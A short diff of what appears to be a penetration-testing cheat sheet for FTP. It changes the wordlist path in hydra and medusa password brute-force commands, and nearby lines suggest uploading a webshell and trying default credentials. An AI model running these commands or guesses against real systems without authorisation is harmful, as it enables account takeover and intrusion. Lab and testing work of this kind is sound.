@@ -55,8 +55,8 @@ Check for writable directories: you may be able to upload a webshell if FTP root
 ## Brute Force
 
 ```bash
-hydra -l $user -P /usr/share/wordlists/rockyou.txt ftp://$IP
-medusa -h $IP -u $user -P /usr/share/wordlists/rockyou.txt -M ftp
+hydra -l $user -P ~/wordlists/rockyou.txt ftp://$IP
+medusa -h $IP -u $user -P ~/wordlists/rockyou.txt -M ftp
 ```
 
 Try default credentials first: `admin:admin`, `ftp:ftp`, `user:password`.
